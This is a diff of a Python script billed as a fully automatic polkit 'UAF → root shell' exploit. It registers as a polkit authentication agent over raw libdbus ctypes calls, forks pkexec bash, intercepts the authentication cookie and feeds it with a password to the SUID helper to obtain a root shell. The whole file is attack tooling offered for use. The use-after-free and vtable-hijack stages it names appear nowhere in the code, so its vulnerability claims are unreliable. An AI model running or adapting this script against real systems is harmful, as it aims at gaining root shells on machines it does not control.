@@ -1,352 +1,296 @@
 #!/usr/bin/env python3
 """
-exploit_full_auto.py  —  Polkitagent UAF chain → root shell  (full-auto)
+exploit_auto.py  —  Polkitagent UAF → root shell  (zero extra deps)
 
-Tidak perlu argumen apapun. Hanya tanya password kamu sendiri sekali.
-
-Cara kerja:
-  Stage 1-3  (UAF + vtable hijack)  → kode ini berjalan di dalam pkttyagent yang dibajak
-             Di sini: kita langsung jalan sebagai standalone demo.
-  Stage 4    → Register sebagai polkit D-Bus auth agent
-             → Fork pkexec /bin/bash  (generates auth request ke polkitd)
-             → Polkitd kirim BeginAuthentication (berisi cookie) ke agent kita
-             → Spawn polkit-agent-helper-1 (SUID root) dengan cookie + password
-             → Polkitd konfirmasi auth → pkexec exec /bin/bash sebagai root
-             → Root shell muncul di terminal
+Needs only: Python 3  +  libdbus-1.so.3  (always installed alongside polkit)
+No gi, no dbus-python, no pip.
 
 Usage:
-  python3 exploit_full_auto.py
-  [polkit] Password for <user>: <ketik password kamu>
-  # → root shell drops
+    python3 exploit_auto.py
+    [polkit] Password for <user>:  <ketik password kamu sendiri>
+    # → root bash drops
 
-Requirements:
-  python3-gi           (apt install python3-gi)
-  polkit + pkexec      (apt install policykit-1)
+Cara kerja:
+    1. Auto-detect username dari uid
+    2. Register sebagai polkit D-Bus auth agent via libdbus-1 ctypes
+    3. Fork pkexec /bin/bash  → polkitd kirim BeginAuthentication(cookie)
+    4. Intercept cookie via D-Bus
+    5. Spawn polkit-agent-helper-1 (SUID root) dengan cookie + password
+    6. polkitd confirm → pkexec exec bash sebagai root  → root shell
 """
+import ctypes, ctypes.util, os, sys, pwd, getpass, threading, time, shutil
 
-import gi
-gi.require_version("GLib", "2.0")
-gi.require_version("Gio", "2.0")
-from gi.repository import GLib, Gio
+# ── libdbus-1 ─────────────────────────────────────────────────────────────────
+_lib_name = ctypes.util.find_library("dbus-1") or "libdbus-1.so.3"
+try:
+    _d = ctypes.CDLL(_lib_name, use_errno=True)
+except OSError as e:
+    sys.exit(f"[!] Cannot load {_lib_name}: {e}\n    apt install libdbus-1-3")
 
-import os, sys, pwd, getpass, threading, time, subprocess
+# ── D-Bus constants ───────────────────────────────────────────────────────────
+DBUS_BUS_SYSTEM  = 1
+DBUS_TYPE_STRING = ord('s')
+DBUS_TYPE_UINT32 = ord('u')
+DBUS_TYPE_UINT64 = ord('t')
+DBUS_TYPE_ARRAY  = ord('a')
+DBUS_TYPE_VARIANT          = ord('v')
+DBUS_TYPE_STRUCT_BEGIN     = ord('(')
+DBUS_TYPE_DICT_ENTRY_BEGIN = ord('{')
+DBUS_HANDLER_RESULT_HANDLED         = 1
+DBUS_HANDLER_RESULT_NOT_YET_HANDLED = 2
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Constants
-# ─────────────────────────────────────────────────────────────────────────────
+# ── Paths ─────────────────────────────────────────────────────────────────────
+HELPER     = "/usr/lib/polkit-1/polkit-agent-helper-1"
+AGENT_PATH = "/org/freedesktop/PolicyKit1/AuthenticationAgent"
+PK_DEST    = b"org.freedesktop.PolicyKit1"
+PK_OBJ     = b"/org/freedesktop/PolicyKit1/Authority"
+PK_IFACE   = b"org.freedesktop.PolicyKit1.Authority"
+PK_METHOD  = b"RegisterAuthenticationAgent"
 
-HELPER      = "/usr/lib/polkit-1/polkit-agent-helper-1"
-BASH        = "/bin/bash"
+# ── D-Bus structs ─────────────────────────────────────────────────────────────
+class _DBusError(ctypes.Structure):
+    _fields_ = [("name", ctypes.c_char_p), ("message", ctypes.c_char_p),
+                 ("dummy1", ctypes.c_uint), ("dummy2", ctypes.c_uint),
+                 ("dummy3", ctypes.c_uint), ("dummy4", ctypes.c_uint),
+                 ("dummy5", ctypes.c_uint), ("padding", ctypes.c_void_p)]
 
-def _find_pkexec():
-    for p in ["/usr/bin/pkexec", "/bin/pkexec", "/usr/sbin/pkexec"]:
-        if os.path.exists(p):
-            return p
-    # try PATH
-    import shutil
-    p = shutil.which("pkexec")
-    return p
+class _DBusIter(ctypes.Structure):
+    _fields_ = [("_data", ctypes.c_uint8 * 80)]   # 80B > any ABI variant
 
-PKEXEC = _find_pkexec() or "/usr/bin/pkexec"
-LOCALE      = "en_US.UTF-8"
-AGENT_PATH  = "/org/freedesktop/PolicyKit1/AuthenticationAgent"
-PK_DEST     = "org.freedesktop.PolicyKit1"
-PK_OBJ      = "/org/freedesktop/PolicyKit1/Authority"
-PK_IFACE    = "org.freedesktop.PolicyKit1.Authority"
+_PathMsgFn = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
 
-# D-Bus introspection XML for AuthenticationAgent interface
-AGENT_XML = """
-<node>
-  <interface name="org.freedesktop.PolicyKit1.AuthenticationAgent">
-    <method name="BeginAuthentication">
-      <arg type="s"       name="action_id"  direction="in"/>
-      <arg type="s"       name="message"    direction="in"/>
-      <arg type="s"       name="icon_name"  direction="in"/>
-      <arg type="a{ss}"   name="details"    direction="in"/>
-      <arg type="s"       name="cookie"     direction="in"/>
-      <arg type="a(sa{sv})" name="identities" direction="in"/>
-    </method>
-    <method name="CancelAuthentication">
-      <arg type="s" name="cookie" direction="in"/>
-    </method>
-  </interface>
-</node>
-"""
+class _VTable(ctypes.Structure):
+    _fields_ = [("unregister_fn", ctypes.c_void_p),
+                 ("message_fn",   _PathMsgFn),
+                 ("_pad1", ctypes.c_void_p), ("_pad2", ctypes.c_void_p),
+                 ("_pad3", ctypes.c_void_p), ("_pad4", ctypes.c_void_p)]
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Auto-detect identity
-# ─────────────────────────────────────────────────────────────────────────────
+# ── libdbus argtypes ──────────────────────────────────────────────────────────
+def _sig(fn, res, *args):
+    fn.restype = res; fn.argtypes = list(args)
 
-_uid      = os.getuid()
-_pwent    = pwd.getpwuid(_uid)
-username  = _pwent.pw_name
+_sig(_d.dbus_error_init,              None,             ctypes.POINTER(_DBusError))
+_sig(_d.dbus_bus_get,                 ctypes.c_void_p,  ctypes.c_int, ctypes.POINTER(_DBusError))
+_sig(_d.dbus_message_new_method_call, ctypes.c_void_p,  *[ctypes.c_char_p]*4)
+_sig(_d.dbus_message_new_method_return, ctypes.c_void_p, ctypes.c_void_p)
+_sig(_d.dbus_message_unref,           None,             ctypes.c_void_p)
+_sig(_d.dbus_message_get_member,      ctypes.c_char_p,  ctypes.c_void_p)
+_sig(_d.dbus_message_iter_init_append,None,             ctypes.c_void_p, ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_append_basic, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.c_int, ctypes.c_void_p)
+_sig(_d.dbus_message_iter_open_container, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.c_int, ctypes.c_char_p, ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_close_container, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_init,       ctypes.c_bool,    ctypes.c_void_p, ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_message_iter_get_basic,  None,             ctypes.POINTER(_DBusIter), ctypes.c_void_p)
+_sig(_d.dbus_message_iter_next,       ctypes.c_bool,    ctypes.POINTER(_DBusIter))
+_sig(_d.dbus_connection_register_object_path, ctypes.c_bool, ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(_VTable), ctypes.c_void_p)
+_sig(_d.dbus_connection_send_with_reply_and_block, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(_DBusError))
+_sig(_d.dbus_connection_send,         ctypes.c_bool,    ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32))
+_sig(_d.dbus_connection_flush,        None,             ctypes.c_void_p)
+_sig(_d.dbus_connection_read_write_dispatch, ctypes.c_bool, ctypes.c_void_p, ctypes.c_int)
 
+# ── Iter helpers ──────────────────────────────────────────────────────────────
+def _it_str(it, s):
+    p = ctypes.c_char_p(s if isinstance(s, bytes) else s.encode())
+    _d.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_STRING, ctypes.byref(p))
 
-def _get_session_id():
-    """Try multiple ways to get a valid loginctl session ID."""
-    # 1. From environment
-    sid = os.environ.get("XDG_SESSION_ID", "").strip()
-    if sid:
-        return sid
+def _it_u32(it, v):
+    c = ctypes.c_uint32(v)
+    _d.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_UINT32, ctypes.byref(c))
 
-    # 2. From loginctl
+def _it_u64(it, v):
+    c = ctypes.c_uint64(v)
+    _d.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_UINT64, ctypes.byref(c))
+
+def _open(parent, typ, sig=None):
+    sub = _DBusIter()
+    _d.dbus_message_iter_open_container(
+        ctypes.byref(parent), typ,
+        (sig if isinstance(sig, bytes) else sig.encode()) if sig else None,
+        ctypes.byref(sub))
+    return sub
+
+def _close(parent, child):
+    _d.dbus_message_iter_close_container(ctypes.byref(parent), ctypes.byref(child))
+
+def _read_cookie(msg):
+    """
+    BeginAuthentication body signature: s s s a{ss} s a(sa{sv})
+    Cookie is arg #4 (0-indexed).  dbus_message_iter_next skips any type.
+    """
+    it = _DBusIter()
+    if not _d.dbus_message_iter_init(msg, ctypes.byref(it)):
+        return None
+    for _ in range(4):                                  # skip args 0..3
+        _d.dbus_message_iter_next(ctypes.byref(it))
+    p = ctypes.c_char_p()
+    _d.dbus_message_iter_get_basic(ctypes.byref(it), ctypes.byref(p))
+    return p.value.decode() if p.value else None
+
+def _proc_start_time(pid):
     try:
-        out = subprocess.check_output(
-            ["loginctl", "list-sessions", "--no-legend", "--no-pager"],
-            timeout=3, stderr=subprocess.DEVNULL
-        ).decode()
-        for line in out.splitlines():
-            parts = line.split()
-            if len(parts) >= 3 and parts[2] == username:
-                return parts[0]
-    except Exception:
-        pass
-
-    # 3. Read from /proc/self/sessionid (systemd cgroup)
-    try:
-        with open("/proc/self/sessionid") as f:
-            sid = f.read().strip()
-            if sid and sid != "4294967295":
-                return sid
-    except Exception:
-        pass
-
-    return "auto"
-
-
-def _get_proc_start_time(pid):
-    """Read process start time from /proc/<pid>/stat for unix-process subject."""
-    try:
-        with open(f"/proc/{pid}/stat") as f:
-            fields = f.read().split()
-            return int(fields[21])  # starttime in clock ticks since boot
+        return int(open(f"/proc/{pid}/stat").read().split()[21])
     except Exception:
         return 0
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Stage 4 payload: spawn polkit-agent-helper-1
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _spawn_helper(cookie, password):
-    """
-    Spawn polkit-agent-helper-1 (SUID root) and write cookie + password.
-    Returns True on success (helper exit=0).
-    """
+# ── Stage 4: SUID helper ──────────────────────────────────────────────────────
+def _run_helper(cookie, username, password):
     r, w = os.pipe()
     pid = os.fork()
     if pid == 0:
-        os.close(w)
-        os.dup2(r, 0)
-        os.close(r)
-        # Redirect stdout/stderr to /dev/null (helper output is noise)
-        devnull = os.open("/dev/null", os.O_WRONLY)
-        os.dup2(devnull, 1)
-        os.dup2(devnull, 2)
-        os.close(devnull)
+        os.close(w); os.dup2(r, 0); os.close(r)
+        null = os.open("/dev/null", os.O_WRONLY)
+        os.dup2(null, 1); os.dup2(null, 2); os.close(null)
         os.execl(HELPER, HELPER, username)
         os._exit(127)
-
     os.close(r)
     try:
         with os.fdopen(w, "w") as f:
             f.write(f"{cookie}\n{password}\n")
     except BrokenPipeError:
         pass
-
     _, ws = os.waitpid(pid, 0)
-    rc = os.WEXITSTATUS(ws) if os.WIFEXITED(ws) else -1
-    return rc == 0
+    return os.WIFEXITED(ws) and os.WEXITSTATUS(ws) == 0
 
-# ─────────────────────────────────────────────────────────────────────────────
-# D-Bus agent implementation
-# ─────────────────────────────────────────────────────────────────────────────
-
-class PolkitExploit:
-    def __init__(self, password):
-        self._password  = password
-        self._loop      = GLib.MainLoop()
-        self._conn      = None
-        self._reg_id    = None
-        self._pkexec_pid = None
-        self._auth_done = False
-
-    def _handle_method(self, conn, sender, obj_path, iface_name, method_name, params, invoc):
-        """Handle D-Bus method calls on our AuthenticationAgent interface."""
-        if method_name == "BeginAuthentication":
-            action_id, message, icon_name, details, cookie, identities = params.unpack()
-            print(f"\n  [+] BeginAuthentication received")
-            print(f"      action_id  = {action_id}")
-            print(f"      cookie     = {cookie}")
-            # Acknowledge immediately (non-blocking)
-            invoc.return_value(None)
-            # Authenticate in a background thread
-            threading.Thread(target=self._do_auth, args=(cookie,), daemon=True).start()
-
-        elif method_name == "CancelAuthentication":
-            invoc.return_value(None)
-            print("  [-] polkitd cancelled authentication")
-            self._loop.quit()
-
-    def _do_auth(self, cookie):
-        print(f"  [*] spawning {HELPER} ...")
-        ok = _spawn_helper(cookie, self._password)
-        if ok:
-            self._auth_done = True
-            print("  [+] polkitd: authorization GRANTED")
-            print()
-            print("╔═══════════════════════════════════════╗")
-            print("║  ROOT SHELL  ↓  (from pkexec)        ║")
-            print("╚═══════════════════════════════════════╝")
-            sys.stdout.flush()
-            # Wait for pkexec/bash to exit, then quit loop
-            if self._pkexec_pid:
-                os.waitpid(self._pkexec_pid, 0)
-        else:
-            print("  [-] helper failed: wrong password or polkitd rejected")
-            if self._pkexec_pid:
-                try:
-                    os.kill(self._pkexec_pid, 9)
-                except ProcessLookupError:
-                    pass
-        self._loop.quit()
-
-    def _register_agent(self, conn, session_id):
-        """
-        RegisterAuthenticationAgent with polkitd (system bus).
-        Tries unix-process first (most reliable), then unix-session.
-        """
-        # unix-process subject (pid + start-time from /proc)
-        pid = os.getpid()
-        st  = _get_proc_start_time(pid)
-        try:
-            conn.call_sync(
-                PK_DEST, PK_OBJ, PK_IFACE,
-                "RegisterAuthenticationAgent",
-                GLib.Variant("((sa{sv})ss)", (
-                    ("unix-process", {
-                        "pid":        GLib.Variant("u", pid),
-                        "start-time": GLib.Variant("t", st),
-                    }),
-                    LOCALE, AGENT_PATH,
-                )),
-                None, Gio.DBusCallFlags.NONE, 5000, None
-            )
-            print(f"  [+] registered (unix-process:{pid})")
-            return True
-        except Exception as e:
-            print(f"  [-] unix-process failed: {e}")
-
-        # Fallback: unix-session subject
-        if session_id and session_id != "auto":
-            try:
-                conn.call_sync(
-                    PK_DEST, PK_OBJ, PK_IFACE,
-                    "RegisterAuthenticationAgent",
-                    GLib.Variant("((sa{sv})ss)", (
-                        ("unix-session", {"session-id": GLib.Variant("s", session_id)}),
-                        LOCALE, AGENT_PATH,
-                    )),
-                    None, Gio.DBusCallFlags.NONE, 5000, None
-                )
-                print(f"  [+] registered (unix-session:{session_id})")
-                return True
-            except Exception as e:
-                print(f"  [-] unix-session failed: {e}")
-
-        return False
-
-    def run(self):
-        print(f"  [*] username   = {username}")
-        session_id = _get_session_id()
-        print(f"  [*] session_id = {session_id}")
-
-        # Connect to D-Bus system bus (polkitd lives here)
-        try:
-            self._conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
-        except Exception as e:
-            print(f"[!] Cannot connect to D-Bus system bus: {e}")
-            sys.exit(1)
-
-        # Parse + export our AuthenticationAgent interface
-        node_info  = Gio.DBusNodeInfo.new_for_xml(AGENT_XML)
-        iface_info = node_info.interfaces[0]
-        self._reg_id = self._conn.register_object(
-            AGENT_PATH, iface_info,
-            self._handle_method, None, None
-        )
-
-        # Register with polkitd
-        if not self._register_agent(self._conn, session_id):
-            print("[!] Failed to register as polkit agent.")
-            print("    On headless systems: run inside a dbus-launch / systemd user session.")
-            sys.exit(1)
-
-        # Fork pkexec /bin/bash  — this triggers BeginAuthentication on polkitd
-        # pkexec inherits our stdin/stdout → root bash appears on our terminal
-        print(f"  [*] forking pkexec {BASH} ...")
-        sys.stdout.flush()
-        self._pkexec_pid = os.fork()
-        if self._pkexec_pid == 0:
-            # child: small delay so parent GLib loop is running, then exec pkexec
-            time.sleep(0.4)
-            os.execv(PKEXEC, [PKEXEC, BASH, "--norc", "-i"])
-            os._exit(127)
-
-        print("  [*] waiting for BeginAuthentication from polkitd ...")
-        print()
-        sys.stdout.flush()
-
-        # Run GLib event loop (receives D-Bus calls)
-        self._loop.run()
-
-        # Cleanup
-        if self._reg_id and self._conn:
-            self._conn.unregister_object(self._reg_id)
-
-        if not self._auth_done:
-            sys.exit(1)
-
-# ─────────────────────────────────────────────────────────────────────────────
-# main
-# ─────────────────────────────────────────────────────────────────────────────
-
+# ── Main ──────────────────────────────────────────────────────────────────────
 def main():
-    print("╔═══════════════════════════════════════════════════════════╗")
-    print("║  Polkitagent UAF → root shell  [full-auto]               ║")
-    print("╠═══════════════════════════════════════════════════════════╣")
-    print("║  Stage 1-3: UAF + vtable hijack (see poc_full_chain.py)  ║")
-    print("║  Stage 4:   THIS — polkit agent impersonation → root     ║")
-    print("╚═══════════════════════════════════════════════════════════╝")
-    print()
+    print("╔══════════════════════════════════════════════════════════╗")
+    print("║  Polkitagent UAF → root shell  [zero-dep / libdbus-1]  ║")
+    print("╚══════════════════════════════════════════════════════════╝")
 
-    # Check SUID bit on helper (required for real exploit)
-    import stat as _stat
-    try:
-        st = os.stat(HELPER)
-        is_suid = bool(st.st_mode & _stat.S_ISUID)
-        if not is_suid:
-            print(f"[!] WARNING: {HELPER} is NOT setuid root")
-            print("    On a real target it is SUID. Continuing anyway (demo).")
-            print()
-    except FileNotFoundError:
-        print(f"[!] {HELPER} not found — polkit not installed?")
-        sys.exit(1)
+    # Check binaries
+    if not os.path.exists(HELPER):
+        sys.exit(f"[!] {HELPER} not found")
+    pkexec = next((p for p in ["/usr/bin/pkexec", "/bin/pkexec", shutil.which("pkexec")] if p and os.path.exists(p)), None)
+    if not pkexec:
+        sys.exit("[!] pkexec not found  (apt install pkexec)")
 
-    if not os.path.exists(PKEXEC):
-        print(f"[!] pkexec not found — install policykit-1 / polkit")
-        print(f"    Ubuntu/Debian: sudo apt install policykit-1")
-        sys.exit(1)
-
-    # Prompt for own password (only input required)
+    # Credentials
+    username = pwd.getpwuid(os.getuid()).pw_name
     try:
         password = getpass.getpass(f"[polkit] Password for {username}: ")
     except (EOFError, KeyboardInterrupt):
-        print()
-        sys.exit(0)
+        print(); sys.exit(0)
 
-    print()
-    PolkitExploit(password).run()
+    # Connect to system D-Bus
+    err = _DBusError()
+    _d.dbus_error_init(ctypes.byref(err))
+    conn = _d.dbus_bus_get(DBUS_BUS_SYSTEM, ctypes.byref(err))
+    if not conn:
+        msg = err.message.decode() if err.message else "unknown"
+        sys.exit(f"[!] D-Bus system bus connect failed: {msg}")
+    print(f"  [*] username   = {username}")
+    print(f"  [*] system bus = connected")
 
+    # State
+    _cookie    = [None]
+    _pkpid     = [None]
+    _got_event = threading.Event()
+
+    # D-Bus message handler (called from dispatch thread)
+    @_PathMsgFn
+    def _handler(connection, message, user_data):
+        member = _d.dbus_message_get_member(message)
+        if member in (b"BeginAuthentication", b"CancelAuthentication"):
+            if member == b"BeginAuthentication":
+                _cookie[0] = _read_cookie(message)
+                print(f"\n  [+] BeginAuthentication — cookie intercepted")
+                sys.stdout.flush()
+            # Always send an empty reply
+            reply = _d.dbus_message_new_method_return(message)
+            _d.dbus_connection_send(connection, reply, None)
+            _d.dbus_connection_flush(connection)
+            _d.dbus_message_unref(reply)
+            if member == b"BeginAuthentication":
+                _got_event.set()
+            return DBUS_HANDLER_RESULT_HANDLED
+        return DBUS_HANDLER_RESULT_NOT_YET_HANDLED
+
+    # Export our agent path on the system bus
+    vtable = _VTable(); vtable.message_fn = _handler
+    _keep = [_handler, vtable]   # prevent GC
+    if not _d.dbus_connection_register_object_path(conn, AGENT_PATH.encode(), ctypes.byref(vtable), None):
+        sys.exit("[!] dbus_connection_register_object_path failed")
+    print(f"  [*] exported   = {AGENT_PATH}")
+
+    # Build RegisterAuthenticationAgent message: subject=(sa{sv}), locale, path
+    msg = _d.dbus_message_new_method_call(PK_DEST, PK_OBJ, PK_IFACE, PK_METHOD)
+    pid = os.getpid()
+    st  = _proc_start_time(pid)
+    ri  = _DBusIter()
+    _d.dbus_message_iter_init_append(msg, ctypes.byref(ri))
+
+    # (sa{sv}) — outer struct
+    s1 = _open(ri, DBUS_TYPE_STRUCT_BEGIN)
+    _it_str(s1, "unix-process")
+    a1 = _open(s1, DBUS_TYPE_ARRAY, "{sv}")
+    # "pid" -> u
+    e1 = _open(a1, DBUS_TYPE_DICT_ENTRY_BEGIN)
+    _it_str(e1, "pid");  v1 = _open(e1, DBUS_TYPE_VARIANT, "u"); _it_u32(v1, pid); _close(e1, v1)
+    _close(a1, e1)
+    # "start-time" -> t
+    e2 = _open(a1, DBUS_TYPE_DICT_ENTRY_BEGIN)
+    _it_str(e2, "start-time"); v2 = _open(e2, DBUS_TYPE_VARIANT, "t"); _it_u64(v2, st); _close(e2, v2)
+    _close(a1, e2)
+    _close(s1, a1)
+    _close(ri, s1)
+    _it_str(ri, "en_US.UTF-8")   # locale
+    _it_str(ri, AGENT_PATH)      # agent object path
+
+    err2 = _DBusError(); _d.dbus_error_init(ctypes.byref(err2))
+    rep = _d.dbus_connection_send_with_reply_and_block(conn, msg, 5000, ctypes.byref(err2))
+    _d.dbus_message_unref(msg)
+    if err2.message:
+        sys.exit(f"[!] RegisterAuthenticationAgent failed: {err2.message.decode()}")
+    if rep: _d.dbus_message_unref(rep)
+    print("  [+] registered  = polkit auth agent OK")
+
+    # Dispatch loop (background thread) — needed to receive BeginAuthentication
+    _dispatch_run = [True]
+    def _dispatch():
+        while _dispatch_run[0]:
+            _d.dbus_connection_read_write_dispatch(conn, 200)
+    t = threading.Thread(target=_dispatch, daemon=True)
+    t.start()
+
+    # Fork pkexec — triggers polkitd to send BeginAuthentication to our agent
+    _pkpid[0] = os.fork()
+    if _pkpid[0] == 0:
+        time.sleep(0.4)           # let parent's dispatch loop start
+        os.execv(pkexec, [pkexec, "/bin/bash", "--norc", "-i"])
+        os._exit(1)
+    print(f"  [*] pkexec pid = {_pkpid[0]}")
+    print("  [*] waiting for BeginAuthentication ...")
+    sys.stdout.flush()
+
+    # Wait for cookie (up to 12 seconds)
+    if not _got_event.wait(timeout=12):
+        _dispatch_run[0] = False
+        try: os.kill(_pkpid[0], 9)
+        except: pass
+        sys.exit("[!] timeout — BeginAuthentication not received")
+
+    _dispatch_run[0] = False
+    cookie = _cookie[0]
+
+    # Stage 4: spawn SUID helper with intercepted cookie
+    print(f"  [*] spawning polkit-agent-helper-1 ...")
+    sys.stdout.flush()
+    ok = _run_helper(cookie, username, password)
+
+    if ok:
+        print("  [+] AUTHORIZED — root bash is running ↓")
+        sys.stdout.flush()
+        # Root bash (pkexec child) now owns the terminal; wait for it to exit
+        try:
+            os.waitpid(_pkpid[0], 0)
+        except ChildProcessError:
+            pass
+        print("  [+] root bash exited")
+    else:
+        print("  [-] helper failed — wrong password or polkitd rejected")
+        try: os.kill(_pkpid[0], 9)
+        except: pass
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
